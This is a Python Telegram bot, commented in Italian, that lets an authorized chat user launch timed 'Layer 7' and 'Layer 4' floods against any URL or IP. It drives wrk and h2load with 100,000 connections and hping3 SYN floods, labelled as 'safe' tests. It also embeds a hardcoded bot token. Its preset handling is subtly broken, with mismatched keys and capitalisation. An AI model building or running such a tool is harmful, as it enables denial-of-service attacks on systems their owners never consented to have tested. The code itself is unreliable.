#!/usr/bin/env python3

import subprocess
import os
import signal
import ipaddress
import threading
import time
from urllib.parse import urlparse

from telegram.ext import Updater, CommandHandler

# ================= CONFIG =================
TOKEN = "8593144725:AAHw5UoWAnrANQCZIw1mwsbNkh8c_roFmLU"
AUTHORIZED_ID = 5699538596  # tuo chat_id numerico
# =========================================

process = None
LAST_DESC = None

progress_thread = None
progress_stop_event = threading.Event()
progress_message = None
MAX_TIME = 600  # secondi

# ================= PRESET SAFE =================

L7_PRESETS = {
  "Basic": {"bin": "wrk", "flags": "-t30 -c100000 -d10m"},
  "Aggressive": {"bin": "h2load", "flags": "-n 10000 -c 100000 -t 30"}
    }

L4_PRESETS = {
  "Default": {"cmd": "hping3", "args": "-S -p {port} -d 9999 --flood"},
  "Fast": {"cmd": "tx_program", "args": "-p {port} -d 30 -t 600"}
    }
# ================= UTILS =================

def is_authorized(update):
    return update.effective_user.id == AUTHORIZED_ID

def is_running():
    return process is not None and process.poll() is None

def kill_process():
    global process
    if is_running():
        os.killpg(os.getpgid(process.pid), signal.SIGTERM)
        process = None

# ================= PROGRESS BAR =================

def progress_bar_loop(context, chat_id, duration):
    global progress_message

    start_time = time.time()
    while not progress_stop_event.is_set():
        elapsed = int(time.time() - start_time)
        remaining = duration - elapsed

        if remaining <= 0:
            kill_process()
            break

        percent = int((elapsed / duration) * 100)
        blocks = int(percent / 5)  # 20 blocchi
        bar = "█" * blocks + "░" * (20 - blocks)

        text = (
            f"🟢 Test in esecuzione ({LAST_DESC})\n"
            f"[{bar}] {percent}%\n"
            f"⏱ {remaining}s rimanenti"
        )

        try:
            progress_message.edit_text(text)
        except:
            pass

        time.sleep(1)

# ================= COMMANDS =================

def start(update, context):
    if not is_authorized(update):
        return

    update.message.reply_text(
        "🤖 Bot pronto.\n\n"
        "L7:\n"
        "  /l7 url:method:tempo  (method: basic|aggressive, max 600s)\n"
        "L4:\n"
        "  /l4 ip:port:method:tempo  (method: default|fast, max 600s)\n\n"
        "/status – stato\n"
        "/stop – ferma test"
    )

# ---------- L7 ----------

def l7_command(update, context):
    global process, LAST_DESC, progress_thread, progress_stop_event, progress_message

    if not is_authorized(update):
        return

    if is_running():
        update.message.reply_text("⚠️ Un test è già in esecuzione")
        return

    if not context.args:
        update.message.reply_text("Uso: /l7 url:method:tempo")
        return

    try:
        url, method, tempo = context.args[0].split(":")
    except ValueError:
        update.message.reply_text("Formato non valido")
        return

    preset = L7_PRESETS.get(method.lower())
    if not preset:
        update.message.reply_text("Preset L7 non valido")
        return

    try:
        tempo = int(tempo)
    except ValueError:
        update.message.reply_text("Tempo non valido")
        return

    if not (1 <= tempo <= MAX_TIME):
        update.message.reply_text(f"Tempo fuori range 1-{MAX_TIME}s")
        return

    parsed = urlparse(url)
    if parsed.scheme not in ("http", "https") or not parsed.netloc:
        update.message.reply_text("URL non valido")
        return

    cmd = [arg.format(url=url) for arg in preset["cmd"]]

    process = subprocess.Popen(
        cmd,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        preexec_fn=os.setsid
    )

    LAST_DESC = f"L7 {method} → {url} : {tempo}s"

    # Barra progressiva
    progress_stop_event.clear()
    progress_message = update.message.reply_text(f"⏳ Avvio test L7 ({tempo}s)...")
    progress_thread = threading.Thread(
        target=progress_bar_loop,
        args=(context, update.effective_chat.id, tempo),
        daemon=True
    )
    progress_thread.start()

# ---------- L4 ----------

def l4_command(update, context):
    global process, LAST_DESC, progress_thread, progress_stop_event, progress_message

    if not is_authorized(update):
        return

    if is_running():
        update.message.reply_text("⚠️ Un test è già in esecuzione")
        return

    if not context.args:
        update.message.reply_text("Uso: /l4 ip:port:method:tempo")
        return

    try:
        ip, port, method, tempo = context.args[0].split(":")
    except ValueError:
        update.message.reply_text("Formato non valido")
        return

    preset = L4_PRESETS.get(method.lower())
    if not preset:
        update.message.reply_text("Preset L4 non valido")
        return

    try:
        ipaddress.ip_address(ip)
    except ValueError:
        update.message.reply_text("IP non valido")
        return

    if not port.isdigit() or not (1 <= int(port) <= 65535):
        update.message.reply_text("Porta non valida")
        return

    try:
        tempo = int(tempo)
    except ValueError:
        update.message.reply_text("Tempo non valido")
        return

    if not (1 <= tempo <= MAX_TIME):
        update.message.reply_text(f"Tempo fuori range 1-{MAX_TIME}s")
        return

    cmd = [arg.format(ip=ip, port=port) for arg in preset["cmd"]]

    process = subprocess.Popen(
        cmd,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        preexec_fn=os.setsid
    )

    LAST_DESC = f"L4 {method} → {ip}:{port} : {tempo}s"

    # Barra progressiva
    progress_stop_event.clear()
    progress_message = update.message.reply_text(f"⏳ Avvio test L4 ({tempo}s)...")
    progress_thread = threading.Thread(
        target=progress_bar_loop,
        args=(context, update.effective_chat.id, tempo),
        daemon=True
    )
    progress_thread.start()

# ---------- STOP ----------

def stop_command(update, context):
    if not is_authorized(update):
        return

    if is_running():
        progress_stop_event.set()
        kill_process()
        update.message.reply_text("⛔ Test fermato manualmente")
    else:
        update.message.reply_text("ℹ️ Nessun test attivo")

# ---------- STATUS ----------

def status_command(update, context):
    if not is_authorized(update):
        return

    if is_running():
        update.message.reply_text(f"🟢 Test attivo\n{LAST_DESC}")
    else:
        update.message.reply_text("🔴 Nessun test attivo")

# ================= MAIN =================

def main():
    updater = Updater(TOKEN, use_context=True)
    dp = updater.dispatcher

    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("l7", l7_command))
    dp.add_handler(CommandHandler("l4", l4_command))
    dp.add_handler(CommandHandler("stop", stop_command))
    dp.add_handler(CommandHandler("status", status_command))

    updater.start_polling()
    updater.idle()


if __name__ == "__main__":
    main()
